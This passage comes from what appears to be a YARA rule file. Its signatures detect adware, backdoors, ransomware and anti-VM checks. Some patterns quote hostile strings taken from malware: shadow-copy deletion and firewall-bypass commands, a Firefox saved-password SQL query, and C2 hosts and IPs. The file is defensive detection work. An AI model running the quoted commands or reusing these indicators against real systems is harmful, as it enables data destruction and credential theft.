$ = "www.ultimatepdfconverter.com" ascii wide
$ = "www.coolpdfcreator.com" ascii wide
$ = "cdnus.ironcdn.com" ascii wide
$ = "esd.baixaki.com.br" ascii wide
$ = "cdneu2.programmersupply.com" ascii wide
condition:
any of them
}rule SSC_LinkuryASample
{
meta:
Description = "Adware.Linkury.A.vb"
ThreatLevel = "5"
strings:
$ = "Smartbar" ascii wide
$ = "Linkury" ascii wide
$ = "ChromeUtils" ascii wide
$ = "FirefoxUtils" ascii wide
$ = "AddBundledSoftware" ascii wide
$ = "UpdateToolbarState" ascii wide
$ = "New Tab Search" ascii wide
$ = "get_BrowserIsOpen" ascii wide
$ = "get_BetterSearchResults" ascii wide
$ = "get_AllYourBrowsers" ascii wide
$ = "get_ChangeHomepageAndSearch" ascii wide
$ = "get_BrowserSettingsProtectOk" ascii wide
$ = "get_BrowserSettingsChange" ascii wide
$ = "get_BrowserSettingsProtectChange" ascii wide
$ = "get_BrowserSettingsProtectDescription" ascii wide
$ = "get_BrowserSettingsProtectHeader" ascii wide
$ = "get_BrowserSettingsProtectKeep" ascii wide
condition:
2 of them
}
rule SSC_LinkuryBSample
{
meta:
Description = "Adware.Linkury.B.vb"
ThreatLevel = "5"
strings:
$ = "C:\\Cranberry\\bin\\CaraDelevigne\\Cara.pdb" ascii wide
condition:
any of them
}rule SSC_MyWebSearchSample
{
meta:
Description = "Adware.MyWebSearch.vb"
ThreatLevel = "5"
strings:
$ = "t8Setup1.pdb" ascii wide
$ = "t8EIPlug.pdb" ascii wide
$ = "t8EzSetp.pdb" ascii wide
$ = "NPt8EISB.pdb" ascii wide
$ = "Mindspark Interactive Network" ascii wide
$ = "mindspark.com" ascii wide
condition:
any of them
}rule SSC_NextLiveSample
{
meta:
Description = "Adware.NextLive.vb"
ThreatLevel = "5"
strings:
$ = "nengine.pdb" ascii wide
$ = "nengine.dll" ascii wide
$ = "D:\\svn.thecodeway.com\\private\\nlive\\trunk" ascii wide
condition:
any of them
}rule SSC_ObronaAdsSample
{
meta:
Description = "Adware.ObronaAds.vb"
ThreatLevel = "5"
strings:
$i1 = "ObronaBlockAds" ascii wide
$i2 = "Obrona Block Ads" ascii wide
$i3 = "ObronaVPN" ascii wide
$i4 = "OBRONA_PROXY" ascii wide
$i5 = "SecurityAndShoppingAdvisor" ascii wide
$i6 = "SASAService" ascii wide
$i7 = "http://update.obrona.org" ascii wide
$i8 = "Proxy-agent: SASA Proxy" ascii wide
$i9 = "Proxy\\AdsInjectionContentProvider.cpp" ascii wide
$ = "sendBrowsersHistoryKeywords" ascii wide
$ = "startWatcher" ascii wide
$ = "HelperApplication" ascii wide
$ = "enableAds" ascii wide
$ = "enableInjecting" ascii wide
$ = "disableInjecting" ascii wide
$ = "requestNewAdsUrl" ascii wide
$ = "requestAdsIgnoredDomains" ascii wide
$ = "startSendingSearchKeywords" ascii wide
$ = "AdsService" ascii wide
$ = "ServiceProxy.cpp" ascii wide
$ = "HelperApplication.cpp" ascii wide
$ = "Updater.cpp" ascii
$ = "WebProxy.cpp" ascii wide
condition:
(any of ($i*)) or (3 of them)
}rule SSC_AdwareOpenCandySample
{
meta:
Description  = "Adware.OpenCandy.vb"
ThreatLevel  = "5"
strings:
$ = "http://cdn.opencandy.com" ascii wide
condition:
any of them
}rule SSC_AdwareOutBrowseSample
{
meta:
Description  = "Adware.OutBrowse.vb"
ThreatLevel  = "5"
strings:
$ = "cdn.install.playbryte.com" ascii wide
$ = "download.2yourface.com" ascii wide
$ = "www.default-page.com" ascii wide
$ = "install2.optimum-installer.com" ascii wide
$ = "downloadzone.org" ascii wide
condition:
any of them
}rule SSC_AdwarePullUpdateSample
{
meta:
Description = "Adware.PullUpdate.vb"
ThreatLevel = "5"
strings:
$ = "gettvwizard.com" ascii wide
$ = "getsharethis.com" ascii wide
$ = "thewebguard.com" ascii wide
$ = "astro-arcade.com" ascii wide
$ = "instashareonline.com" ascii wide
$ = "safewebonline.com" ascii wide
$ = "downloadmeteoroids.com" ascii wide
$ = "moviemasterapp.com" ascii wide
$ = "watchzombieinvasion.com" ascii wide
$ = "freevideoconverterapp.com" ascii wide
// $ = "TVWizard" ascii wide
//$ = "TV Wizard" ascii wide
$ = "AstroArcade" ascii wide
$ = "WebGuard Deleter" ascii wide
$ = "SmallIslandDevelopment" ascii wide
$ = "AVFirefoxCookieReader" ascii wide
$ = "AVChromeCookieReader" ascii wide
$ = "AVInternetExplorerCookieReader" ascii wide
$ = "AVBrowserCookieReader" ascii wide
$ = "Data Protection Solutions" ascii wide
$ = "VideoDimmer.exe" ascii wide
$ = "VideoDimmerService.exe" ascii wide
$ = "WebGuard.exe" ascii wide
$ = "WebGuardService.exe" ascii wide
$ = "HealthAlert.exe" ascii wide
$ = "HealthAlertService.exe" ascii wide
$ = "CrimeWatch.exe" ascii wide
$ = "CrimeWatchService.exe" ascii wide
$ = "SafeWeb.exe" ascii wide
$ = "SafeWebService.exe" ascii wide
$ = "Meteoroids.exe" ascii wide
$ = "MeteoroidsService.exe" ascii wide
$ = "Websteroids.exe" ascii wide
$ = "WebsteroidsService.exe" ascii wide
$ = "WebShield.exe" ascii wide
$ = "WebShieldService.exe" ascii wide
$ = "ZombieNews.exe" ascii wide
$ = "ZombieNewsService.exe" ascii wide
$ = "CelebrityAlertService.exe" ascii wide
$ = "CelebrityAlert.exe" ascii wide
$ = "MovieMaster.exe" ascii wide
$ = "MovieMasterService.exe" ascii wide
$ = "ZombieInvasionService.exe" ascii wide
$ = "ZombieInvasion.exe" ascii wide
$ = "BreakingNewsAlertService.exe" ascii wide
$ = "BreakingNewsAlert.exe" ascii wide
condition:
any of them
}rule SSC_SearchProtectSample
{
meta:
Description = "Adware.SProtect.vb"
ThreatLevel = "5"
strings:
$ = "Search Protect" ascii wide
$ = "SearchProtect" ascii wide
$ = "Search Protector" ascii wide
$ = "SearchProtector" ascii wide
$ = "ClientConnect" ascii wide
$ = "SPVC32.dll" ascii wide
$ = "SPVC32Loader.dll" ascii wide
$ = "SPVC64.dll" ascii wide
$ = "SPVC64Loader.dll" ascii wide
$ = "SProtector" ascii wide
$ = "AppendInit.dll" ascii wide
$ = "{12DA0E6F-5543-440C-BAA2-28BF01070AFA}" ascii wide
$pdb1 = "CltMngSvc.pdb" ascii wide
$pdb2 = "SPtool.pdb" ascii wide
$pdb3 = "SPtool64.pdb" ascii wide
$pdb4 = "SPVC32.pdb" ascii wide
$pdb5 = "SPVC64.pdb" ascii wide
$pdb6 = "SPVC32Loader.pdb" ascii wide
$pdb7 = "SPVC64Loader.pdb" ascii wide
$pdb8 = "cltmng.pdb" ascii wide
$pdb9 = "MiniStubUtils.pdb" ascii wide
$pdb10 = "Search Protector" ascii wide
$pdb11 = "%programfiles%\\Free Offers from" ascii wide
$pdb12 = "TestSearchProtect" ascii wide
$pdb13 = "ProtectService.pdb" ascii wide
$pdb14 = "E:\\supsoft" ascii wide
$pdb15 = "BrowerWatch.dll" ascii wide
condition:
(2 of them) or (any of ($pdb*))
}rule SSC_SearchSuiteSample
{
meta:
Description = "Adware.SearchSuite.vb"
ThreatLevel = "5"
strings:
//$ = "SearchSuite" ascii wide
$ = "searchcore.net" ascii wide
$ = "searchnu.com" ascii wide
$ = "searchqu.com" ascii wide
$ = "searchsheet.com" ascii wide
$ = "adoresearch.com" ascii wide
$ = "newsearchtab.com" ascii wide
$ = "searchsupreme.com" ascii wide
$ = "mlsearch.com" ascii wide
$ = "insertsearch.com" ascii wide
$ = "gotsearch.com" ascii wide
$ = "search.ask.com" ascii wide
$ = "search-results.com" ascii wide
$ = "default-search.net" ascii wide
$ = "imesh web search" ascii wide
condition:
any of them
}rule SSC_AdwareSendoriSample
{
meta:
Description = "Adware.Sendori.vb"
ThreatLevel = "5"
strings:
$ = "SendoriSvc.pdb" ascii wide
$ = "SendoriTray.pdb" ascii wide
$ = "sendori64f.sys" ascii wide
$ = "sendori64r.sys" ascii wide
$ = "sendori32.sys" ascii wide
$ = "Sendori.dll" ascii wide
$ = "SendoriProxy.dll" ascii wide
$ = "SendoriUp.exe" ascii wide
$ = "SendoriSvc.exe" ascii wide
$ = "SendoriTray.exe" ascii wide
$ = "SendoriControl.exe" ascii wide
$ = "sendori-win-upgrader.exe" ascii wide
$ = "\\\\.\\pipe\\Sendori" ascii wide
$ = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\Sendori" ascii wide
$ = "SOFTWARE\\Sendori" ascii wide
$ = "Sendori, Inc" ascii wide
$ = "Sendori Service" ascii wide
$ = "Service Sendori" ascii wide
$ = "Application Sendori" ascii wide
$ = "SendoriLSP" ascii wide
$ = "Sendori Elevated Service Controller" ascii wide
$ = "Sendori-Client" ascii wide
$ = "SENDORI_UPGRADE_ASSISTANT" ascii wide
condition:
any of them
}rule SSC_SimplyTechSample
{
meta:
Description = "Adware.SimplyTech.vb"
ThreatLevel = "5"
strings:
$ = "wtb_64.pdb" ascii wide
$ = "wtb_64.DLL" ascii wide
$ = "wtb.ToolbarInfo" ascii wide
$ = "Surf Canyon" ascii wide
$ = "surfcanyon" ascii wide
condition:
any of them
}rule SSC_SmartAppsSample
{
meta:
Description = "Adware.SmartApps.vb"
ThreatLevel = "5"
strings:
$a1 = "Unicows.dll" ascii wide
$a2 = "FrameworkBHO.DLL" ascii wide
$a3 = "URLDownloadToFile" ascii wide
$a4 = "getExtensionFileContents" ascii wide
$a5 = "Toolbar" ascii wide
$a6 = "GdiplusStartup" ascii wide
$b1 = "getCookieW" ascii wide
$b2 = "setCookieW" ascii wide
$b3 = "InternetSetCookieW" ascii wide
$b5 = "InternetGetCookieExW" ascii wide
condition:
(all of ($b*)) and (any of ($a*))
}rule SSC_AdwareSolimbdaSample
{
meta:
Description = "Adware.Solimbda.vb"
ThreatLevel = "5"
strings:
$ = "http://api.downloadmr.com" ascii wide
$ = "SuggestedApps" ascii wide
condition:
all of them
}rule SSC_TriorisSample
{
meta:
Description = "Adware.Trioris.vb"
ThreatLevel = "5"
strings:
$ = "instamarket.js" ascii wide
$ = "instamarketoff.js" ascii wide
$ = "trioris.net" ascii wide
$ = "storegid.com" ascii wide
$ = "screentoolkit.com" ascii wide
$ = "Sergey Cherezov" ascii wide
condition:
any of them
}rule SSC_AdwareVitruvianSample
{
meta:
Description = "Adware.Vitruvian.vb"
ThreatLevel = "5"
strings:
$ = "WordProser" ascii wide
$ = "vitruvian" ascii wide
$ = "gethighlightly.com" ascii wide
$ = "betterbrainapp.com" ascii wide
$ = "wordproser.com" ascii wide
$ = "intellitermapp.com" ascii wide
$ = "BetterBrainClientIE.pdb" ascii wide
condition:
any of them
}rule SSC_AdwareWajamSample
{
meta:
Description  = "Adware.Wajam.vb"
ThreatLevel  = "5"
strings:
$ = "fastnfreedownload.com" ascii wide
$ = "InternetEnhancer.exe" ascii wide
$ = "InternetEnhancerService.exe" ascii wide
$ = "WJManifest" ascii wide
$ = "WaInterEnhance" ascii wide
$ = "ping_wajam" ascii wide
$ = "D:\\jenkins\\workspace" ascii wide
$ = "WajamService" ascii wide
$ = "AVCWJService" ascii wide
$ = "Internet Enhancer Service" ascii wide
$a1 = "WajamInternetEnhancerService.pdb" ascii wide
$a4 = "WHttpServer.pdb" ascii wide
$a2 = "Wajam. All right reserved" ascii wide
$a3 = "Wajam.Proxy" ascii wide
condition:
(3 of them) or (any of ($a*))
}rule SSC_RootkitSampleDriverAgony
{
meta:
Description  = "Trojan.Agony.sm"
ThreatLevel  = "5"
strings:
$  = "DosDevices\\agony" ascii wide
$  = "Device\\agony" ascii wide
$  = "VOLUME.INI" ascii wide
$  = "ERVICES.EXE" ascii wide
$  = "ervices.exe" ascii wide
$  = "agony rootkit" ascii wide
$  = "agony" ascii wide
$  = "for exemple: agony -p process1.exe process2.exe" ascii wide
$a = "i386\\agony.pdb" ascii wide
condition:
(3 of them) or $a
}
rule SSC_AdwareSampleWebTools
{
meta:
Description  = "Adware.WebTools.sm"
ThreatLevel  = "5"
strings:
$ = "IEctrl.log" ascii wide
$ = "agony" ascii wide
$s1 = "Gates.pdb" ascii wide
$s0 = "GatesInstall.pdb" ascii wide
$s2 = "IECtrl.pdb" ascii wide
$s3 = "svch0st.exe" ascii wide
$s4 = "SESDKDummy.dll" ascii wide
$s5 = "SESDKDummy64.dll" ascii wide
condition:
(3 of them) or (any of ($s*))
}rule SSC_AdwareWebWatcherSample
{
meta:
Description = "Adware.WebWatcher.vb"
ThreatLevel = "5"
strings:
$ = "E:\\BuildSource\\7\\WindowsClient\\WindowsClient.Client.RC\\Binaries" ascii wide
$ = "Release DlpHook\\mcapp.pdb" ascii wide
$ = "Release DlpHook\\mcsc.pdb" ascii wide
$ = "Release Sonar\\Shim64.pdb" ascii wide
$ = "Release Sonar\\Shim.pdb" ascii wide
condition:
any of them
}rule SSC_AdwareiBryteSample
{
meta:
Description  = "Adware.iBryte.vb"
ThreatLevel  = "5"
strings:
$ = "install.ibryte.com" ascii wide
$ = "pn-installer28.com" ascii wide
condition:
any of them
}rule SSC_AdwareUCSKoreaSample
{
meta:
Description  = "Adware.uKor.sm"
ThreatLevel  = "5"
strings:
$ = "_uninstall_Mutex" ascii wide
$ = "_updater_Mutex" ascii wide
$ = "_main_Mutex" ascii wide
$ = "_install_Mutex" ascii wide
$ = "main_agent" ascii wide
$ = "updater_agent" ascii wide
$ = "APP/bundle.php" ascii wide
$ = "APP/update_ck.php?v1" ascii wide
$ = "APP/bundle_stat.php?v1" ascii wide
$ = "APP/stat.php?v1" ascii wide
$ = "co.kr/mbk.php?v1" ascii wide
$ = "co.kr/etc/yak_app.htm" ascii wide
$hex1 = { 51 a1 ?? ?? ?? ?? 56 68 80 1f 40 00 50 ff ?? ?? ?? ?? ?? a3 ?? ?? ?? ?? 85 c0 0f ?? ?? ?? ?? ?? 33 d2 68 b8 0b 00 00 8d ?? ?? c7 ?? ?? ?? ?? ?? ?? ?? ?? ?? c7 ?? ?? ?? ?? ?? ?? ?? ?? ?? e8 ?? ?? ?? ?? 83 c4 04 85 c0 74 ?? 68 3f 00 0f 00 6a 00 6a 00 ff ?? ?? ?? ?? ?? 85 c0 74 ?? 8b ?? ?? ?? ?? ?? 68 ff 01 0f 00 51 50 ff ?? ?? ?? ?? ?? 8b f0 85 f6 74 ?? 6a 00 6a 04 e8 ?? ?? ?? ?? 83 c4 08 68 c8 e8 41 00 ff ?? ?? ?? ?? ?? e8 ?? ?? ?? ?? 6a 00 6a 01 e8 ?? ?? ?? ?? 83 c4 08 eb ?? 8b ?? ?? ?? 68 28 6e 42 00 6a 01 56 ff ?? ?? ?? ?? ?? 83 ?? ?? ?? ?? ?? ?? 5e 74 ?? 6a 00 ff ?? ?? ?? ?? ?? 8b d0 b8 01 00 00 00 e8 ?? ?? ?? ?? 83 c4 04 59 c2 08 00}
condition:
(2 of them) or (any of ($hex*))
}rule SSC_BladabindiASample
{
meta:
Description = "Backdoor.Bladabindi.A.vb"
ThreatLevel = "5"
strings:
$ = "shutdown -r -t 00" ascii wide
$ = "netsh firewall add allowedprogram" ascii wide
$ = "netsh firewall delete allowedprogram" ascii wide
$ = "cmd.exe /k ping 0 & del" ascii wide
$ = "ReceiveBufferSize" ascii wide
$ = "SendBufferSize" ascii wide
$ = "restartcomputer" ascii wide
$ = "NoWindowsUpdate" ascii wide
$ = "winupdateoff" ascii wide
$ = "DisableTaskMgr" ascii wide
$ = "set cdaudio door closed" ascii wide
$ = "set cdaudio door open" ascii wide
$ = "VMDragDetectWndClass" ascii wide
$ = "%dark%" ascii wide
$ = "microwaveone.ddns.net" ascii wide
condition:
5 of them
}rule SSC_BackdoorDediprosA
{
meta:
Description  = "Backdoor.Dedipros.rc"
ThreatLevel  = "5"
strings:
$ = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/advapi32.dll" ascii wide
$ = "rundll32.exe %s, CodeMain lpServiceName" ascii wide
$ = "C:\\Windows\\System32\\Rundlla.dll" ascii wide
$ = "s%\\pmeT\\SWODNIW\\:C" ascii wide
$ = "SYSTEM\\CurrentControlSet\\Services\\%s" ascii wide
$ = "\\keylog.dat" ascii wide
condition:
2 of them
}rule SSC_BackdoorWin32FynloskiASample
{
meta:
Description  = "Backdoor.Fynloski.sm"
ThreatLevel  = "5"
strings:
$ = "#BOT#VisitUrl" ascii wide
$ = "#BOT#OpenUrl" ascii wide
$ = "#BOT#Ping" ascii wide
$ = "BTRESULTPing|Res" ascii wide
$ = "#BOT#RunPrompt" ascii wide
$ = "BTRESULTClose" ascii wide
$ = "#BOT#SvrUninstal" ascii wide
$ = "#BOT#URLUpdate" ascii wide
$ = "BTERRORUpdate" ascii wide
$ = "BTRESULTUpdate" ascii wide
$ = "#BOT#URLDownload" ascii wide
$ = "BTRESULTOpen" ascii wide
$ = "BTERRORDownload" ascii wide
$ = "BTRESULTDownload" ascii wide
$ = "BTRESULTMass" ascii wide
$ = "BTRESULTHTTP" ascii wide
$ = "BTERRORVisit" ascii wide
$ = "BTRESULTSyn" ascii wide
$ = "BTRESULTUDP" ascii wide
$ = "Flood|UDP Flood task finished" ascii wide
$ = "Flood|Syn task finished" ascii wide
$ = "Flood|Http Flood task finished" ascii wide
condition:
3 of them
}rule SSC_BackdoorGenASample
{
meta:
Description = "Backdoor.Gen.A.vb"
ThreatLevel = "5"
strings:
$ = "Form1" ascii wide
$ = "Flamand" ascii wide
$ = "Afildoe.Belver" ascii wide
$ = "FromBase64String" ascii wide
$ = "TeAdor.Properties.Resources" ascii wide
condition:
3 of them
}rule SSC_BackdoorLiudoor
{
meta:
author = "RSA FirstWatch"
date = "2015-07-23"
Description = "Backdoor.Liudoor.sm"
ThreatLevel  = "5"
hash0 = "78b56bc3edbee3a425c96738760ee406"
hash1 = "5aa0510f6f1b0e48f0303b9a4bfc641e"
hash2 = "531d30c8ee27d62e6fbe855299d0e7de"
hash3 = "2be2ac65fd97ccc97027184f0310f2f3"
hash4 = "6093505c7f7ec25b1934d3657649ef07"
type = "Win32 DLL"
strings:
$string0 = "Succ" ascii wide
$string1 = "Fail" ascii wide
$string2 = "pass" ascii wide
$string3 = "exit" ascii wide
$string4 = "svchostdllserver.dll" ascii wide
$string5 = "L$,PQR" ascii wide
$string6 = "0/0B0H0Q0W0k0" ascii wide
$string7 = "QSUVWh" ascii wide
$string8 = "Ht Hu[" ascii wide
condition:
all of them
}
rule SSC_MirageAPTBackdoorSample
{
meta:
Description  = "Backdoor.Mirage.sm"
ThreatLevel  = "5"
strings:
$a1 = "welcome to the desert of the real" ascii wide
$a2 = "Mirage" ascii wide
$b = "Encoding: gzip" ascii wide
$c = /\/[A-Za-z]*\?hl=en/
condition:
(($a1 or $a2) or $b) and $c
}rule SSC_TrojanWin32Vawtrak_BackDoor
{
meta:
Description  = "Backdoor.Win32.sm"
ThreatLevel  = "5"
strings:
$ = "[VNC] New Client" ascii wide
$ = "[VNC] Fail init BC" ascii wide
$ = "[VNC] Fail addr proto BC" ascii wide
$ = "[VNC] Fail connect BC" ascii wide
$ = "[VNC] Fail init work:" ascii wide
$ = "[VNC] Start Sever" ascii wide
$ = "[VNC] Parse param error:" ascii wide
$ = "[VNC] Fail create  process:" ascii wide
$ = "[VNC] Fail inject to process:" ascii wide
$ = "[Socks] New Client" ascii wide
$ = "[Socks] Failt Init BC" ascii wide
$ = "[Socks] Fail add proto BC" ascii wide
$ = "[Socks] Failt connect BC" ascii wide
$ = "[Socks] Fail parse param:" ascii wide
$ = "[Pony] Fail Get Pass" ascii wide
$ = "DL_EXEC Status [Pipe]" ascii wide
$ = "DL_EXEC Status[Local]" ascii wide
$ = "Start Socks addr:" ascii wide
$ = "Start Socks Status[Pipe]" ascii wide
$ = "Start Socks Status[Local]" ascii wide
$ = "Start VNC addr: %s" ascii wide
$ = "Start VNC Status[Pipe]: %u-%u-%u" ascii wide
$ = "Start VNC Status[Local]: %u" ascii wide
$ = "PID: %u [%0.2u:%0.2u:%0.2u]" ascii wide
$ = "[BC] Cmd Ver Error" ascii wide
$ = "[BC] Wait Ping error %u[%u]" ascii wide
$ = "[BC] Fail Connect" ascii wide
$ = "[BC] Fail send auth" ascii wide
$ = "[BC] Fail read cmd" ascii wide
$ = "[BC] cmd error: %u" ascii wide
$ = "[BC] Cmd need disconnect" ascii wide
$ = "SELECT hostname, encryptedUsername, encryptedPassword FROM moz_logins" ascii wide
$str_0 = "T:\\Develop\\EQ2\\bin\\tmp" ascii wide
$str_1 = "T:\\Develop\\EQ2\\bin\\tmp\\client_32.pdb" ascii wide
$str_2 = "T:\\Develop\\EQ2\\bin\\tmp\\client_64.pdb" ascii wide
$str_3 = "client_64.dll" ascii wide
$str_4 = "client_32.dll" ascii wide
condition:
(5 of them) or (any of ($str_*))
}
rule SSC_BackdoorZegostSampleA
{
meta:
Description  = "Backdoor.Zegost.rc"
ThreatLevel  = "5"
strings:
$a = "VIPBlackDDOS" ascii wide
$b = "SynFlood" ascii wide
$c = "ICMPFlood" ascii wide
$d = "UDPFlood" ascii wide
$e = "DNSFlood" ascii wide
$f = "Game2Flood" ascii wide
$g = "HTTPGetFlood" ascii wide
condition:
2 of them
}rule SSC_MalwareBitCoinMinerSample_A
{
meta:
Description  = "Malware.BitCoinMiner.sm"
ThreatLevel  = "5"
strings:
$ = "Min3Win.exe" ascii wide
$ = "bitcoin-miner.exe" ascii wide
$ = "WINSXS32" ascii wide
$ = "http://xhuehs.cantvenlinea.ru:1942" ascii wide
$ = "bigbob0000001@gmail.com" ascii wide
condition:
3 of them
}rule SSC_TinyLoaderSample
{
meta:
Description  = "Malware.TinyLoader.vb"
ThreatLevel  = "5"
strings:
$ = "B1 Tiny Loader/1.0" ascii wide
condition:
all of them
}rule SSC_PWSPasswordsToDBApp
{
meta:
Description  = "PWS.PassDB.sm"
ThreatLevel  = "5"
strings:
$pdb0 = "PasswordsToDB.pdb" ascii wide
$ipa0 = "82.146.47.116" ascii wide
$ipa1 = "82.146.54.187" ascii wide
condition:
any of them
}rule SSC_PUPSystemOptimizerASample
{
meta:
Description  = "PUP.SystemOptimizer.vb"
ThreatLevel  = "5"
strings:
$ = "http://bitest.softservers.net" ascii wide
$ = "http://bi.softservers.net" ascii wide
condition:
any of them
}rule SSC_PUPSystweakSample
{
meta:
Description  = "PUP.Systweak.vb"
ThreatLevel  = "5"
strings:
$ = "Systweak Software0" ascii wide
$ = "pc-updater.com/miscservice/miscservice.asmx" ascii wide
condition:
any of them
}rule SSC_RansomCryptoApp_A
{
meta:
Description  = "Ransom.CryptoApp.sm"
ThreatLevel  = "5"
strings:
$pdb0 = "CryptoApp.pdb" ascii wide
$pdb1 = "KeepAlive.pdb" ascii wide
$pdb2 = "SelfDestroy.pdb" ascii wide
$pdb3 = "CoreDownloader.pdb" ascii wide
condition:
(3 of them) or (any of ($pdb*))
}
rule SSC_RansomCryptoWallApp_3
{
meta:
Description  = "Ransom.CryptoWall.sm"
ThreatLevel  = "5"
strings:
$s0 = "spatopayforwin.com" ascii wide
$s1 = "bythepaywayall.com" ascii wide
$s2 = "lowallmoneypool.com" ascii wide
$s3 = "transoptionpay.com" ascii wide
$s4 = "HELP_DECRYPT" ascii wide nocase
$s5 = "speralreaopio.com" ascii wide
$s6 = "vremlreafpa.com" ascii wide
$s7 = "wolfwallsreaetpay.com" ascii wide
$s8 = "askhoreasption.com" ascii wide
condition:
any of ($s*)
}
rule SSC_RansomCBTLockerApp
{
meta:
Description  = "Ransom.CBTLocker.sm"
ThreatLevel  = "5"
strings:
$s0 = "Your personal files are encrypted by CTB-Locker" ascii wide
$s1 = "Your documents, photos, databases and other important files have been encrypted with strongest encryption and unique key,generated for this computer" ascii wide
$s2 = "Private decryption key is stored on a secret Internet server and nobody can decrypt your files until you pay and obtain the private key." ascii wide
$s3 = "If you see the main locker window, follow the instructions on the locker. Overwise, it's seems that you or your antivirus deleted the locker program" ascii wide
$s6 = "keme132.DLL" ascii wide
$s7 = "klospad.pdb" ascii wide
condition:
(any of ($s*)) or (3 of them)
}
rule SSC_RansomEncryptorRaaSApp
{
meta:
Description  = "Ransom.EncryptorRaaS.sm"
ThreatLevel  = "5"
strings:
$s0 = "decryptoraveidf7.onion.to" ascii wide
$s1 = "encryptor_raas_readme_liesmich.txt" ascii wide
$s2 = "The files on your computer have been securely encrypted by Encryptor RaaS" ascii wide
$s3 = "Die Dateien auf Ihrem Computer wurden von Encryptor RaaS sicher verschluesselt" ascii wide
$s4 = "encryptor3awk6px.onion" ascii wide
condition:
any of ($s*)
}
rule SSC_RansomSampleTeslaCryptA
{
meta:
Description  = "Ransom.TeslaCrypt.sm"
ThreatLevel  = "5"
strings:
$ = "HOWTO_RESTORE_FILES.TXT" ascii wide nocase
$ = "HOWTO_RESTORE_FILES.bmp" ascii wide nocase
$ = "HOWTO_RESTORE_FILES.HTML" ascii wide nocase
condition:
any of them
}
rule SSC_RansomSampleTeslaCryptB
{
meta:
Description  = "Ransom.TeslaCrypt.B.sm"
ThreatLevel  = "5"
strings:
$ = "help_recover_instructions" ascii wide nocase
$ = "help_recover_instructions.TXT" ascii wide nocase
$ = "help_recover_instructions.png" ascii wide nocase
condition:
any of them
}
rule SSC_RansomSampleChimeraB
{
meta:
Description  = "Ransom.Win32.Chimera.sm"
ThreatLevel  = "5"
strings:
$ = "YOUR_FILES_ARE_ENCRYPTED.HTML" ascii wide nocase
$ = "Projects\\Ransom\\bin\\Release\\Core.pdb" ascii wide nocase
$ = "BM-2cW44Yq9DWbHYnRSfzBLVxvE6WjadchNBt" ascii wide nocase
condition:
any of them
}
rule SSC_RansomSampleLeChiffre
{
meta:
Description  = "Ransom.Win32.LeChiffre.sm"
ThreatLevel  = "5"
strings:
$ = "LeChiffre" ascii wide nocase
$ = "decrypt.my.files@gmail.com" ascii wide nocase
$ = "http://184.107.251.146/sipvoice.php?" ascii wide nocase
$ = "_secret_code.txt" ascii wide nocase
$ = "_How to decrypt LeChiffre files.html" ascii wide nocase
condition:
2 of them
}
rule SSC_RansomSampleHydraCrypt
{
meta:
Description  = "Ransom.Win32.HydraCrypt.sm"
ThreatLevel  = "5"
strings:
$ = "README_DECRYPT_HYDRA_ID_" ascii wide nocase
$ = "hydracrypt_ID_" ascii wide nocase
$ = "HYDRACRYPT" ascii wide nocase
$ = "ccc=hydra01_" ascii wide nocase
condition:
2 of them
}
rule SSC_RansomFilecoderA
{
meta:
Description  = "Ransom.FileCoder.A.vb"
ThreatLevel  = "5"
strings:
$ = "Guji36" ascii wide
$ = "Burnamedoxi" ascii wide
$ = "S48H1G54JSPSODKMGdfH1FD5G8DSDPSDKMFSSJJPGMCNDHS2FH5" ascii wide
condition:
any of them
}
rule SSC_RansomSampleLockyCrypt
{
meta:
Description  = "Ransom.Win32.Locky.sm"
ThreatLevel  = "5"
strings:
$s1 = ".locky" ascii wide nocase
$ = "&encrypted=" ascii wide nocase
$s2 = "_Locky_recover_instructions.txt" ascii wide nocase
$s3 = "_Locky_recover_instructions.bmp" ascii wide nocase
$ = "94.242.57.45" ascii wide nocase
$ = "46.4.239.76" ascii wide nocase
$s6 = "Software\\Locky" ascii wide nocase
$ = "vssadmin.exe Delete Shadows" ascii wide nocase
$ = "Locky" ascii wide nocase
$o1 = { 45 b8 99 f7 f9 0f af 45 b8 89 45 b8 } // address=0x4144a7
$o2 = { 2b 0a 0f af 4d f8 89 4d f8 c7 45 } // address=0x413863
condition:
(3 of them) or (any of ($s*)) or (all of ($o*))
}
rule SSC_RansomLocky
{
meta:
Description  = "Ransom.Locky.ab"
ThreatLevel  = "5"
strings:
$mz = { 4d 5a }
$inst1 = "_HELP_instructions.bmp" ascii wide
$inst2 = "_HELP_instructions.html" ascii wide
$inst3 = "_HELP_instructions.txt" ascii wide
$inst4 = "_Locky_recover_instructions.bmp" ascii wide
$inst5 = "_Locky_recover_instructions.txt" ascii wide
$deleteShadows = "vssadmin.exe" ascii wide // universal Ransom detect :)
$cyrptEP1 = {e8 95 23 ff ff 86 c8 86 ea e9 8d 23 ff ff 86 f4 e9 84 23 ff ff 86 c5} // EP paked locy
$cyrptEP2 = {55 8b ec eb 68 eb 66 eb 64 6a 00 6a 00 6a 00 6a 00 6a 00} // EP packed locy 2
condition:
( $mz at 0 ) and
(
$cyrptEP1 at pe.entry_point or
$cyrptEP2 at pe.entry_point or
(any of ($inst*)) or
$deleteShadows
)
}
rule SSC_RansomImportDetect
{
meta:
Description  = "Ransom.Gen.ab"
ThreatLevel  = "3"
condition:
(pe.imports("Kernel32.dll", "FindFirstFileW") or pe.imports("Kernel32.dll", "FindFirstFileA")) and
(pe.imports("Kernel32.dll", "FindNextFileW") or pe.imports("Kernel32.dll", "FindNextFileA")) and
(pe.imports("Advapi32.dll", "CryptAcquireContextW") or pe.imports("Advapi32.dll", "CryptAcquireContextA")) and
pe.imports("Advapi32.dll", "CryptEncrypt") and
pe.imports("Advapi32.dll", "CryptGenRandom")
}
rule SSC_VMdetectMisc
{
meta:
Description = "Risk.VMDtc.sm"
ThreatLevel = "3"
strings:
$vbox1 = "VBoxService" nocase ascii wide
$vbox2 = "VBoxTray" nocase ascii wide
$vbox3 = "SOFTWARE\\Oracle\\VirtualBox Guest Additions" nocase ascii wide
$vbox4 = "SOFTWARE\\\\Oracle\\\\VirtualBox Guest Additions" nocase ascii wide
$wine1 = "wine_get_unix_file_name" ascii wide
$vmware1 = "vmmouse.sys" ascii wide
$vmware2 = "VMware Virtual IDE Hard Drive" ascii wide
$miscvm1 = "SYSTEM\\ControlSet001\\Services\\Disk\\Enum" nocase ascii wide
$miscvm2 = "SYSTEM\\\\ControlSet001\\\\Services\\\\Disk\\\\Enum" nocase ascii wide
$vmdrv1 = "hgfs.sys" ascii wide
